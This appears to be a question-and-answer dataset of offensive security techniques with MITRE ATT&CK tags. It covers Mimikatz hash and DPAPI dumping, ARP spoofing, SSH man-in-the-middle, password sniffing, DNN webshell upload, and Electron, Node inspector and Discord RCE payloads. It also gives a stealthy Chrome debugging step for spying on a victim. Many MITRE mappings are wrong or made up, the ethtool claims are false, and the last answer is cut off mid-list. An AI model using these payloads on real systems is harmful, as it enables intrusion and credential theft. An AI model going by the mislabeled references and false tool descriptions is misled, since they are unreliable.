Attackers can also exploit the vulnerability to gather session cookies, manipulate MX records to receive or send emails from a legitimate subdomain, and even perform higher-order risks like NS record takeover. MITRE References: MITRE ID is T1583, MITRE Name is: Acquire Infrastructure, and MITRE Tactics are: Resource Development.

## Q: How can you clobber the `window.someObject` variable to execute malicious code?
A: In JavaScript, it's common to find `var someObject = window.someObject || {};`. Manipulating HTML on the page allows overriding `someObject` with a DOM node, potentially introducing security vulnerabilities. For example, you can replace `someObject` with an anchor element pointing to a malicious script. You can also use a `form` element to clobber the `attributes` property and bypass sanitization. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: How can you use the doona tool to fuzz the HTTP protocol against a target system?
A: To use the doona tool to fuzz the HTTP protocol against a target system, you can run the following command: `doona -m HTTP -t 192.168.1.15 -M 5`. This will use the HTTP plugin (`-m HTTP`) to fuzz the target at `192.168.1.15`, and stop after executing 5 fuzz cases (`-M 5`). You can also use additional options to control the timeout, resume fuzzing, or keep trying until the server passes a health check. MITRE References: MITRE ID is T1119, MITRE Name is: Automated Collection, and MITRE Tactics are: Discovery.

## Q: How can you use dotdotpwn to discover directory traversal vulnerabilities in an FTP server?
A: To use dotdotpwn to discover directory traversal vulnerabilities in an FTP server, you can run the following command:

```dotdotpwn.pl -m ftp -h 192.168.1.1```

This will use the FTP scan module (`-m ftp`) to test the host at `192.168.1.1`. dotdotpwn will generate a large number of traversal patterns and test them against the FTP server. If a vulnerability is found, the tool will report the details in the output and a report file.

The key steps are:
- Use the `ftp` module to target an FTP server
- Specify the target host with `-h`
- dotdotpwn will automatically generate and test traversal paths
- Review the output and report file for any discovered vulnerabilities MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: How can you use dotdotpwn to discover directory traversal vulnerabilities in a TFTP server?
A: To use dotdotpwn to discover directory traversal vulnerabilities in a TFTP server, you can run the following command:

```dotdotpwn.pl -m tftp -h 192.168.1.1```

This will use the TFTP scan module (`-m tftp`) to test the host at `192.168.1.1`. dotdotpwn will generate a large number of traversal patterns and test them against the TFTP server. If a vulnerability is found, the tool will report the details in the output and a report file.

The key steps are:
- Use the `tftp` module to target a TFTP server
- Specify the target host with `-h`
- dotdotpwn will automatically generate and test traversal paths
- Review the output and report file for any discovered vulnerabilities MITRE References: MITRE ID is T1210, MITRE Name is: Exploitation for Client Execution, and MITRE Tactics are: Execution.

## Q: How can you upload an ASP webshell in DNN to achieve remote code execution?
A: In `Settings -> Security -> More -> More Security Settings` you can **add new allowed extensions** under `Allowable File Extensions`, and then clicking the `Save` button. Add `asp` or `aspx` and then in `/admin/file-management` upload an **asp webshell** called `shell.asp` for example. Then access to `/Portals/0/shell.asp` to access your webshell. MITRE References: MITRE ID is T1505, MITRE Name is: Webshell, and MITRE Tactics are: TA0003.

## Q: How can you extract and decrypt the DPAPI master keys?
A: You can use the mimikatz `dpapi::cred` module to extract and decrypt the DPAPI master keys. The general command is:

```
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
```
You can find the `guidMasterKey` value from the output of `mimikatz dpapi::cred` command, which can be used as the `<MASTERKEY>` value to decrypt the protected data. MITRE References: MITRE ID is T1555, MITRE Name is: Credentials from Password Stores, and MITRE Tactics are: TA0006, TA0009.

## Q: How can the arpspoof tool be used to intercept packets on a switched LAN?
A: The arpspoof tool can be used to intercept packets on a switched LAN by sending out forged ARP replies. This can be done with the following command:

arpspoof -i <interface> -t <target_ip> <gateway_ip>

This will send out fake ARP replies to the target, causing them to send their traffic through the attacker's machine before forwarding it to the actual gateway. This allows the attacker to sniff and potentially modify the traffic. MITRE References: MITRE ID is T1557, MITRE Name is: Adversary-in-the-Middle, and MITRE Tactics are: Execution, Privilege Escalation, Lateral Movement.

## Q: How can the dsniff tool be used to sniff passwords from network traffic?
A: The dsniff tool can be used to sniff passwords from network traffic with the following command:

dsniff -i <interface>

This will cause dsniff to listen for and display cleartext passwords from supported protocols like FTP, Telnet, SMTP, HTTP, POP, etc. Version 2.4b1 of dsniff is used in this example. MITRE References: MITRE ID is T1539, MITRE Name is: Steal or Forge Credentials, and MITRE Tactics are: Credential Access.

## Q: How can the filesnarf tool be used to sniff files from NFS traffic?
A: The filesnarf tool can be used to sniff files from NFS traffic with the following command:

filesnarf -i <interface>

This will cause filesnarf to listen for and save files that are transferred over NFS on the specified interface. The saved files can then be accessed by the attacker. MITRE References: MITRE ID is T1005, MITRE Name is: Data from Local System, and MITRE Tactics are: Collection.

## Q: How can the macof tool be used to flood a switched LAN with random MAC addresses?
A: The macof tool can be used to flood a switched LAN with random MAC addresses with the following command:

macof -i <interface> -n <times>

This will cause macof to generate and send a large number of packets with random source MAC addresses. This can be used to overwhelm the switch's MAC address table, potentially causing it to fall back to hub mode and allow the attacker to sniff all traffic. MITRE References: MITRE ID is T1557, MITRE Name is: Adversary-in-the-Middle, and MITRE Tactics are: Execution, Privilege Escalation, Lateral Movement.

## Q: How can the sshmitm tool be used to perform a man-in-the-middle attack against SSH connections?
A: The sshmitm tool can be used to perform a man-in-the-middle attack against SSH connections with the following command:

sshmitm -p <local_port> <target_host> <target_port>

This will cause sshmitm to listen on the specified local port and forward connections to the target host and port, while also sniffing the SSH traffic. This allows the attacker to intercept and potentially modify the SSH session. MITRE References: MITRE ID is T1556, MITRE Name is: Modify Authentication Process, and MITRE Tactics are: Credential Access, Lateral Movement.

## Q: How can you dump the local Administrator hash inside a Domain Controller (DC)?
A: To dump the local Administrator hash inside a Domain Controller, you can use Mimikatz. First, run the following command to elevate your token and then dump the SAM hashes:

```
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```

This will give you the local Administrator hash, which you can then use to access the DC remotely. MITRE References: MITRE ID is T1003, MITRE Name is: OS Credential Dumping, and MITRE Tactics are: TA0006.

## Q: How can Dufflebag be used to search for secrets in public EBS snapshots?
A: Dufflebag is a tool that can be used to search through public Elastic Block Storage (EBS) snapshots for secrets that may have been accidentally left in. It is designed to be run as an Elastic Beanstalk application, which allows it to automatically scale up or down as needed. To use Dufflebag, you will need to deploy it in an AWS environment, clone the snapshot, make a volume from the snapshot, attach the volume, mount the volume, and then run the tool. The version used in this example is 0.0~git20200205.9a01942-0kali3. MITRE References: MITRE ID is T1039, MITRE Name is: Data from Network Shared Drive, and MITRE Tactics are: Discovery.

## Q: How can DumpsterDiver be used to search for hardcoded API keys or other sensitive data in a directory of files?
A: DumpsterDiver (version 0~git20200911-0kali2) can be used to search for hardcoded API keys and other sensitive data in a directory of files. To do this, run the following command:`DumpsterDiver.py -p LOCAL_PATH -l 1`This will search the directory specified by `LOCAL_PATH` for typical API keys and other secrets, which are usually 40-66 bytes long. You can adjust the search level by using `-l 0` for short keys (20-40 bytes), `-l 2` for long keys (66-1800 bytes), or `-l 3` for any length key.Additionally, you can customize the search by adjusting parameters like the minimum/maximum key length and entropy threshold. For example:`DumpsterDiver.py -p LOCAL_PATH -l 1 --min-key 40 --max-key 66 --entropy 4.3`This will search for API keys and other secrets that are 40-66 bytes long and have an entropy level of at least 4.3. MITRE References: MITRE ID is T1552, MITRE Name is: Unsecured Credentials, and MITRE Tactics are: TA0006.

## Q: How can dumpzilla be used to extract forensic information from Firefox, Iceweasel, and Seamonkey browsers?
A: Dumpzilla (version 20210311-0kali1) is a Python 3.x tool that can extract forensic information from Firefox, Iceweasel, and Seamonkey browsers. To use it, run the following command with the path to the browser's profile directory:

```
python dumpzilla.py /path/to/profile/directory --All
```

This will dump all available information including cookies, history, bookmarks, downloads, and more. You can also use various options to filter and export specific data, such as:

- `--Cookies`: Extract cookie information
- `--History`: Dump browsing history
- `--Bookmarks`: Extract bookmarks
- `--Export /path/to/directory`: Export data as JSON files

Dumpzilla supports wildcards and regular expressions for filtering data. Refer to the tool's help menu for more details on available options and usage. MITRE References: MITRE ID is T1005, MITRE Name is: Data from Local System, and MITRE Tactics are: Collection.

## Q: How can you send a command injection payload through a vulnerable D-Bus interface?
A: You can send a command injection payload through a vulnerable D-Bus interface using a Python script that connects to the D-Bus interface and calls the vulnerable method with the payload. For example, you can use the `dbus-send` command or the Python `dbus` module to invoke the vulnerable method and pass the payload as a parameter. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: TA0004.

## Q: How can eaphammer version 1.14.0 be used to perform an evil twin attack against a WPA2-Enterprise network?
A: To perform an evil twin attack against a WPA2-Enterprise network using eaphammer version 1.14.0, you can use the '--creds' or '--brad' flags. This will allow you to harvest EAP credentials from clients by forcing them to authenticate to a rogue access point. The tool will automatically configure the access point, handle RADIUS authentication, and capture the credentials. MITRE References: MITRE ID is T1484, MITRE Name is: Domain Generation Algorithms, and MITRE Tactics are: Initial Access, Lateral Movement.

## Q: How can eaphammer version 1.14.0 be used to perform a PMKID attack against a WPA2-PSK network?
A: To perform a PMKID attack against a WPA2-PSK network using eaphammer version 1.14.0, you can use the '--pmkid' flag. This will allow you to capture the PMKID hash and crack the WPA2-PSK passphrase using tools like hcxtools without needing to capture a full 4-way handshake. MITRE References: MITRE ID is T1558.003, MITRE Name is: Pass the Hash: PMKID-based, and MITRE Tactics are: Credential Access, Lateral Movement.

## Q: How can eapmd5pass version 1.5 be used to recover a user's authentication credentials from a live EAP-MD5 exchange?
A: To use eapmd5pass version 1.5 to recover a user's authentication credentials from a live EAP-MD5 exchange, you can follow these steps:1. Put your network interface into monitor mode to capture the live EAP-MD5 authentication traffic.2. Run eapmd5pass with the -i option to specify the monitored interface and the -w option to provide a wordlist of potential passwords.3. eapmd5pass will capture the EAP-MD5 challenge and response values from the live traffic and perform an offline dictionary attack to attempt to recover the user's password.For example:eapmd5pass -i mon0 -w wordlist.txt MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: TA0006.

## Q: How can you edit an exploit to bypass security controls?
A: To edit an exploit, you may need to modify the payload or update the return address. This can help bypass security controls and get the exploit to work. Common steps include:

1. Analyze the exploit to understand the required inputs and expected behavior.
2. Modify the payload to bypass signature-based detection or other security controls.
3. Update the return address if the exploit is targeting a specific memory location.
4. Test the edited exploit to ensure it functions as expected. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: How can you exploit the ECB vulnerability by removing entire blocks?
A: Knowing the format of the cookie (`<username>|<password>`), in order to impersonate the username `admin` create a new user called `aaaaaaaaadmin` and get the cookie and decode it. You can then remove the first block of 8B and you will get a valid cookie for the username `admin`. MITRE References: MITRE ID is T1565, MITRE Name is: Data Manipulation, and MITRE Tactics are: Impact.

## Q: How can you use the tool `cefdebug` to find and exploit Node.js inspectors?
A: The tool `cefdebug` can be used to find inspectors running locally and inject code into them. You can use it as follows:
```
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
``` MITRE References: MITRE ID is T1218, MITRE Name is: System Binary Proxy Execution, and MITRE Tactics are: Execution, Defense Evasion.

## Q: What are some common ways to achieve RCE in a Node.js debugger/inspector?
A: Some common ways to obtain RCE when you can connect to a Node inspector include:
```
process.mainModule.require('child_process').exec('calc')
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require('child_process').spawnSync('calc.exe')
Browser.open(JSON.stringify({url: "c:\\windows\\system32\\calc.exe"}))
```
Note that these RCE exploits may not work if connected to a browser via the Chrome DevTools Protocol. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Execution, Privilege Escalation, Defense Evasion.

## Q: How can you perform post-exploitation after compromising a user's machine with a Chrome/Chromium-based browser?
A: After compromising a user's machine with a Chrome/Chromium-based browser, you can launch a Chrome process with the debugging activated and port-forward the debugging port. This way, you will be able to inspect everything the victim does with Chrome and steal sensitive information. The stealthy way is to terminate every Chrome process and then call:
```
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
``` MITRE References: MITRE ID is T1555, MITRE Name is: Credentials from Web Browsers, and MITRE Tactics are: Credential Access, Collection.

## Q: How can you execute arbitrary code using the "exit" event listener in Electron?
A: The "exit" event listener is set by the internal Electron code when page loading is started. This event is emitted just before navigation. The process object has a reference to the "require" function, which can be used to execute arbitrary code. By overwriting the call function of the prototype, you can execute the 'child_process.execSync('calc')' command to launch the calculator application. MITRE References: MITRE ID is T1574, MITRE Name is: Hijack Execution Flow, and MITRE Tactics are: Persistence, Privilege Escalation, Defense Evasion.

## Q: How can you use prototype pollution to obtain the "require" object and execute arbitrary code in Electron?
A: By using prototype pollution, you can obtain the "require" object and execute arbitrary code. The specific steps involve leaking the "require" object and then exploiting it to execute malicious commands. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Execution, Privilege Escalation, Defense Evasion.

## Q: How can you exploit an Electron app's IPC (Inter-Process Communication) to achieve Remote Code Execution (RCE)?
A: If the preload script exposes an IPC endpoint from the main.js file, the renderer process will be able to access it and if vulnerable, a RCE might be possible. For example, if the `main.js` listens on `getUpdate` and will download and execute any URL passed, or if the `preload.js` exposes a way to call `shell.openExternal`, it's possible to achieve RCE. Additionally, if the preload script exposes ways to communicate with the main process, an XSS will be able to send any event, which can lead to RCE depending on what the main process exposes in terms of IPC. MITRE References: MITRE ID is T1559, MITRE Name is: Inter-Process Communication, and MITRE Tactics are: TA0004, TA0005, TA0009.

## Q: How can an attacker bypass the protection that prevents executing local files in an Electron app?
A: The attacker can inject the following JavaScript code via XSS or arbitrary page navigation to bypass the protection:

```
<script>
Array.prototype.indexOf = function(){
    return 1337;
}
</script>
<a href="file:///C:/Windows/systemd32/calc.exe">CLICK</a>
```

The `SAFE_PROTOCOLS.indexOf` call will always return 1337, allowing the attacker to execute the `calc.exe` file. MITRE References: MITRE ID is T1222, MITRE Name is: User Interface Manipulation, and MITRE Tactics are: TA0007.

## Q: How can an attacker achieve RCE in the Discord desktop app by overriding JavaScript built-in methods?
A: The attacker can achieve RCE in the Discord desktop app by overriding the `RegExp.prototype.test` and `Array.prototype.join` methods, and then calling the `DiscordNative.nativeModules.requireModule('discord_utils').getGPUDriverVersions()` function. This will cause the `execa` library to execute the `calc` application instead of the intended `nvidia-smi.exe` program.

```
RegExp.prototype.test=function(){
    return false;
}
Array.prototype.join=function(){
    return "calc";
}
DiscordNative.nativeModules.requireModule('discord_utils').getGPUDriverVersions();
``` MITRE References: MITRE ID is T1106, MITRE Name is: Native API, and MITRE Tactics are: TA0004.

## Q: How can you exploit the `preload` feature in Electron to achieve RCE?
A: The `preload` script is loaded before other scripts in the renderer process, and it has unlimited access to Node APIs. This can be exploited to achieve remote code execution (RCE) by exporting Node features to the web page:

```new BrowserWindow{  webPreferences: {    nodeIntegration: false,    preload: _path2.default.join(__dirname, 'perload.js'),  }});```

preload.js:```typeof require === 'function';window.runCalc = function(){    require('child_process').exec('calc')};```

index.html:```<body>    <script>        typeof require === 'undefined';        runCalc();    </script></body>```

**Note:** This won't work if `contextIsolation` is set to `on`. MITRE References: MITRE ID is T1559, MITRE Name is: Inter-Process Communication, and MITRE Tactics are: TA0004.

## Q: How can you exploit the `contextIsolation` feature in Electron to achieve RCE?
A: Even if `contextIsolation` is enabled, it is possible to achieve remote code execution (RCE) by overwriting built-in methods used in the preload script or Electron internal code. This can be done by:

1. Executing **arbitrary JavaScript in the renderer** (e.g., via XSS or navigation to external sites)
2. **Overwriting the built-in method** which is used in preload or Electron internal code with your own function
3. **Triggering** the use of the **overwritten function**

This is explained in more detail in the following resources:

- [Electron contextIsolation RCE via preload code](/network-services-pentesting/pentesting-web/electron-desktop-apps/electron-contextisolation-rce-via-preload-code)
- [Electron contextIsolation RCE via Electron internal code](/network-services-pentesting/pentesting-web/electron-desktop-apps/electron-contextisolation-rce-via-electron-internal-code)
- [Electron contextIsolation RCE via IPC](/network-services-pentesting/pentesting-web/electron-desktop-apps/electron-contextisolation-rce-via-ipc) MITRE References: MITRE ID is T1197, MITRE Name is: BITS Jobs, and MITRE Tactics are: TA0005.

## Q: How can you exploit a vulnerability in the Chromium version used by an Electron application to achieve RCE?
A: If the **chromium** used by the application is **old** and there are **known** **vulnerabilities** on it, it might be possible to **exploit it and obtain RCE through a XSS**. You can see an example in this **writeup**: <https://blog.electrovolt.io/posts/discord-rce/> MITRE References: MITRE ID is T1211, MITRE Name is: Exploitation for Defense Evasion, and MITRE Tactics are: TA0005.

## Q: How can you use a XSS vulnerability in an Electron application to perform phishing attacks?
A: If you found a XSS vulnerability but cannot trigger RCE or steal internal files, you could try to use it to **steal credentials via phishing**. 

First, you need to understand how the application handles opening new URLs, by checking the JavaScript code in the front-end:

```webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)```

The `**openInternally**` function will decide if the **link** will be **opened** in the **desktop window** as it's a link belonging to the platform, **or** if will be opened in the **browser as a 3rd party resource**.

If the **regex** used by the function is **vulnerable to bypasses** (for example by **not escaping the dots of subdomains**), an attacker could abuse the XSS to **open a new window which** will be located in the attacker's infrastructure **asking for credentials** from the user:

```<script>window.open("<http://subdomainagoogleq.com/index.html>")</script>``` MITRE References: MITRE ID is T1204, MITRE Name is: User Execution, and MITRE Tactics are: TA0007.

## Q: What are some common EL injection payloads for remote code execution?
A: Common RCE payloads include using Runtime.getRuntime().exec(), ProcessBuilder, reflection, and script engine injection techniques. Payloads can be constructed to execute commands, download files, and more. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: How can you bypass WAFs when attempting EL injection attacks?
A: Techniques to bypass WAFs include using alternative payload formats, obfuscation, and leveraging vulnerabilities in the WAF implementation itself. MITRE References: MITRE ID is nan, MITRE Name is: nan, and MITRE Tactics are: .

## Q: How can email2phonenumber v0.0.1 be used to perform open-source intelligence (OSINT) collection on a target's phone number?
A: email2phonenumber v0.0.1 can be used to collect OSINT on a target's phone number in the following ways:1. Scraping: Use the `scrape` command to initiate password reset requests on various websites using the target's email address. This can reveal partial or masked phone numbers associated with the email.2. Generating: Use the `generate` command to generate all valid phone numbers based on the target's country's numbering plan. This can provide a list of potential phone numbers to investigate further.3. Bruteforcing: Use the `bruteforce` command to iterate through a list of phone numbers and initiate password reset requests on different websites. This can reveal the target's phone number if it is associated with the provided email address.The tool automates the discovery of a target's phone number by abusing password reset design weaknesses and publicly available data. MITRE References: MITRE ID is T1589, MITRE Name is: Gather Victim Identity Information, and MITRE Tactics are: Information Gathering.

## Q: How can email2phonenumber v0.0.1 be used to perform social engineering attacks against a target?
A: email2phonenumber v0.0.1 can be used to obtain a target's phone number, which can then be leveraged for social engineering attacks. With the target's phone number, an attacker could:1. Impersonate the target or a trusted entity and call the target, attempting to gain sensitive information through deception.2. Send SMS messages to the target, posing as a legitimate entity and tricking the target into disclosing sensitive information or performing an action.3. Use the phone number to cross-reference other online profiles and gather additional information about the target, which can be used in further social engineering attempts.However, using email2phonenumber for these purposes would be unethical and likely illegal in many jurisdictions. The tool is designed for legitimate OSINT collection, not for malicious social engineering attacks. MITRE References: MITRE ID is T1555, MITRE Name is: Interface Masquerading, and MITRE Tactics are: Defense Evasion, Credential Access.

## Q: How can EmailHarvester be used to perform OSINT on a target domain and collect email addresses?
A: EmailHarvester can be used to retrieve email addresses from a target domain by leveraging various search engines. The tool supports searching on Google, Bing, Yahoo, ASK, Baidu, Dogpile, and Exalead. To use EmailHarvester, run the following command and specify the target domain:

```
emailharvester -d example.com -s results.txt
```

This will save the discovered email addresses to a text file named `results.txt`. You can also limit the number of search results using the `-l` option and customize the user-agent header with `-u`. EmailHarvester version 1.3.2 supports these features. MITRE References: MITRE ID is T1593, MITRE Name is: Search Open Websites and Domains, and MITRE Tactics are: Intelligence Gathering.

## Q: How can EmailHarvester be used to automate email harvesting across multiple engines and websites?
A: EmailHarvester supports searching multiple search engines and websites by using the `-e` option to specify the engine and the `-r` option to exclude certain plugins. For example, to search Google, LinkedIn, and Twitter for email addresses on the domain `example.com`, you can run:

```
emailharvester -d example.com -e all -r google,linkedin,twitter -s results.txt
```

This will search all supported engines except Google, LinkedIn, and Twitter, and save the results to `results.txt`. The tool's plugin system allows for easy extension to support additional websites in the future. EmailHarvester version 1.3.2 includes these automation features. MITRE References: MITRE ID is T1597, MITRE Name is: Search Closed Sources, and MITRE Tactics are: Intelligence Gathering.

## Q: How can emails be used to gain access to systems?
A: Emails can be used for various attacks such as phishing, malware distribution, and social engineering to gain initial access to systems. Common techniques include sending malicious attachments or links, impersonating trusted entities, and exploiting vulnerabilities in email clients and servers. MITRE References: MITRE ID is T1566, MITRE Name is: Phishing, and MITRE Tactics are: Initial Access.

## Q: How can email addresses be harvested for phishing campaigns?
A: Email addresses can be harvested from various sources, such as web pages, online directories, social media, and leaked data dumps. Automated tools like web scrapers and email harvesting scripts can be used to gather large lists of email addresses for targeted phishing campaigns. MITRE References: MITRE ID is T1589, MITRE Name is: Gather Victim Identity Information, and MITRE Tactics are: Resource Development.

## Q: What are some sources to find information about people connected to a target organization?
A: Some sources to find information about people connected to a target organization include: the company website, social media (LinkedIn, Facebook, Twitter, etc.), forums and newsgroups, and metadata from documents. On the company website, check the blog for employee posts. On social media, search for the company name. Use exiftool to check metadata of documents found on the target's website. Tools like theharvester can also be used to harvest email addresses, but results may be limited. MITRE References: MITRE ID is T1589, MITRE Name is: Gather Victim Identity Information, and MITRE Tactics are: Discovery.

## Q: How can you abuse the 5th parameter ($additional_parameters) of the PHP mail() function?
A: This parameter is going to be added to the command line PHP will be using to invoke the binary sendmail. However, it will be sanitised with the function `escapeshellcmd($additional_parameters)`. An attacker can **inject extract parameters for sendmail** in this case. MITRE References: MITRE ID is T1566.002, MITRE Name is: Phishing: Spearphishing Link, and MITRE Tactics are: Initial Access.

## Q: How can you use the +, -, and {} symbols to bypass email whitelists?
A: The symbols: **+, -** and **{}** in rare occasions can be used for tagging and ignored by most e-mail servers. E.g. john.doe+intigriti@example.com â†’ john.doe@example.com. **Comments between parentheses ()** at the beginning or the end will also be ignored, e.g. john.doe(intigriti)@example.com â†’ john.doe@example.com. MITRE References: MITRE ID is T1566.002, MITRE Name is: Phishing: Spearphishing Link, and MITRE Tactics are: Initial Access.

## Q: How can you leverage third-party SSO services to perform XSS and account takeover attacks?
A: Some services like **github** or **salesforce allows** you to create an **email address with XSS payloads on it**. If you can **use this providers to login on other services** and this services **aren't sanitising** correctly the email, you could cause **XSS**.

If a **SSO service** allows you to **create an account without verifying the given email address** (like **salesforce**) and then you can use that account to **login in a different service** that **trusts** salesforce, you could access any account. MITRE References: MITRE ID is T1550.001, MITRE Name is: Use Alternate Authentication Material: Application Access Token, and MITRE Tactics are: Defense Evasion, Privilege Escalation.

## Q: How can an attacker retrieve complete DEP profiles for arbitrary serial numbers?
A: The exploitation process can be automated using Python with the LLDB API, which allows for programmatically injecting arbitrary serial numbers and retrieving the corresponding DEP profiles. This is done by:

1. Attaching LLDB to `cloudconfigurationd`.
2. Locating the point where the system serial number is fetched.
3. Injecting an arbitrary serial number into the memory before the payload is encrypted and sent. MITRE References: MITRE ID is T1553, MITRE Name is: Subvert Trust Controls, and MITRE Tactics are: Defense Evasion.

## Q: How can an attacker bypass SSL/TLS security measures when intercepting DEP requests?
A: Attempts to intercept and modify DEP requests to *iprofiles.apple.com* using tools like Charles Proxy were hindered by payload encryption and SSL/TLS security measures. However, enabling the `MCCloudConfigAcceptAnyHTTPSCertificate` configuration allows bypassing the server certificate validation, although the payload's encrypted nature still prevents modification of the serial number without the decryption key. MITRE References: MITRE ID is T1030, MITRE Name is: Data Transfer Size Limits, and MITRE Tactics are: Discovery.

## Q: How can an attacker use binary instrumentation to modify the DEP request payload in `cloudconfigurationd`?
A: Modifying the DEP request payload before JSON serialization in `cloudconfigurationd` proved effective. The process involved:

1. Attaching LLDB to `cloudconfigurationd`.
2. Locating the point where the system serial number is fetched.
3. Injecting an arbitrary serial number into the memory before the payload is encrypted and sent. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Defense Evasion, Privilege Escalation, Execution.

## Q: How can enumiax be used to perform a dictionary attack against a target IAX server?
A: To perform a dictionary attack against a target IAX server using enumiax, run the following command:enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 192.168.1.1This will use the unix_users.txt dictionary file to enumerate usernames on the target IAX server at 192.168.1.1. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: CredentialAccess.

## Q: How can you bypass path restrictions on Windows?
A: Some ways to bypass path restrictions on Windows include:

- Environment variables: There are a lot of environment variables that are pointing to some path
- Other protocols: about:, data:, ftp:, file:, mailto:, news:, res:, telnet:, view-source:
- Symbolic links
- Shortcuts: CTRL+N (open new session), CTRL+R (Execute Commands), CTRL+SHIFT+ESC (Task Manager), Windows+E (open explorer), CTRL-B, CTRL-I (Favourites), CTRL-H (History), CTRL-L, CTRL-O (File/Open Dialog), CTRL-P (Print Dialog), CTRL-S (Save As)
- Hidden Administrative menu: CTRL-ALT-F8, CTRL-ESC-F9
- Shell URIs: shell:Administrative Tools, shell:DocumentsLibrary, shell:Librariesshell:UserProfiles, shell:Personal, shell:SearchHomeFolder, shell:Systemshell:NetworkPlacesFolder, shell:SendTo, shell:UsersProfiles, shell:Common Administrative Tools, shell:MyComputerFolder, shell:InternetFolder
- UNC paths: Paths to connect to shared folders. You should try to connect to the C$ of the local machine ("\\127.0.0.1\c$\Windows\System32") MITRE References: MITRE ID is T1548, MITRE Name is: Abuse Elevation Control Mechanism, and MITRE Tactics are: Privilege Escalation.

## Q: What browser tricks can be used to access restricted areas in a KIOSK environment?
A: Some browser tricks that can be used to access restricted areas in a KIOSK environment include:- Using the 'Image Toolbar' in Internet Explorer, which allows you to save, print, open in explorer, etc.- Using 'shell' protocol URLs in Internet Explorer to access various system folders, like 'shell:Administrative Tools', 'shell:DocumentsLibrary', etc.- Creating a common file dialog using JavaScript and accessing the file explorer: `document.write('<input/type=file>')`- Using backup versions of kiosk browsers like http://swin.es/k/ and http://www.ikat.kronicd.net/ MITRE References: MITRE ID is T1071, MITRE Name is: Application Layer Protocol, and MITRE Tactics are: Command and Control.

## Q: What gestures and shortcuts can be used to escape from a restricted iPad environment?
A: Some useful gestures and shortcuts for escaping a restricted iPad environment include:Gestures:- Swipe up with four (or five) fingers / Double-tap Home button: To view the multitask view and change App- Swipe one way or another with four or five fingers: In order to change to the next/last App- Pinch the screen with five fingers / Touch Home button / Swipe up with 1 finger from the bottom of the screen in a quick motion to the up: To access Home- Swipe down from the top of the display with 1 finger: To view your notifications- Swipe down with 1 finger the top-right corner of the screen: To see iPad Pro's control centre- Swipe 1 finger from the left of the screen 1-2 inches: To see Today view- Swipe fast 1 finger from the centre of the screen to the right or left: To change to next/last AppShortcuts:- âŒ˜H: Go to Home- âŒ˜â‡§H (Command-Shift-H): Go to Home- âŒ˜ (Space): Open Spotlight- âŒ˜â‡¥ (Command-Tab): List last ten used apps- âŒ˜~ : Go t the last App- âŒ˜â‡§3 (Command-Shift-3): Screenshot- âŒ˜â‡§4: Screenshot and open it in the editor- Press and hold âŒ˜: List of shortcuts available for the App- âŒ˜âŒ¥D (Command-Option/Alt-D): Brings up the dock- ^âŒ¥H (Control-Option-H): Home button- ^âŒ¥H H (Control-Option-H-H): Show multitask bar- ^âŒ¥I (Control-Option-i): Item chooser- Escape: Back button MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can you escape from a chroot jail by abusing /proc?
A: You can mount procfs into a directory inside the chroot, then look for a PID that has a different root/cwd entry (like /proc/1/root) and chroot into that entry to escape the jail. MITRE References: MITRE ID is T1611, MITRE Name is: Escape to Host, and MITRE Tactics are: Defense Evasion.

## Q: How can you escape from a Bash jail by creating an executable script?
A: Check if you can create an executable file with `/bin/bash` as the content. You can write the contents of `/bin/bash` to a writable and executable path, like `w wx/path`. MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can you escape from a Lua jail using the `debug.debug()` function?
A: If you are inside a limited Lua shell, you can call `debug.debug()` to get a new, potentially less limited Lua shell. MITRE References: MITRE ID is T1611, MITRE Name is: Escape to Host, and MITRE Tactics are: Defense Evasion.

## Q: How can you escape from a Lua jail by abusing the string and os libraries?
A: You can try to chain functions from the string library (like `char()`) and the os library (like `execute()`) to execute commands, even if you don't have direct access to those functions. This can be done through brute force techniques to find the right order of functions to call. MITRE References: MITRE ID is T1611, MITRE Name is: Escape to Host, and MITRE Tactics are: Defense Evasion.

## Q: How can ethtool be used to perform network manipulation attacks?
A: Ethtool version 6.7 can be used to perform network manipulation attacks in the following ways:
1. To change the MAC address of a network interface, run `ethtool -P DEVNAME XX:XX:XX:XX:XX:XX` to set a spoofed MAC address.
2. To enable or disable network interface features like checksum offloading, run `ethtool -K DEVNAME feature on|off` to potentially bypass security controls.
3. To change the speed, duplex, or other physical layer settings of a network interface, run `ethtool -s DEVNAME speed %d duplex half|full` to potentially create denial-of-service conditions. MITRE References: MITRE ID is T1565, MITRE Name is: Data Manipulation, and MITRE Tactics are: TA0040.

## Q: How can ethtool be used to perform network reconnaissance?
A: Ethtool version 6.7 can be used to perform network reconnaissance in the following ways:
1. To get detailed information about a network interface, including the MAC address, driver, and other settings, run `ethtool -i DEVNAME` to gather host and network information.
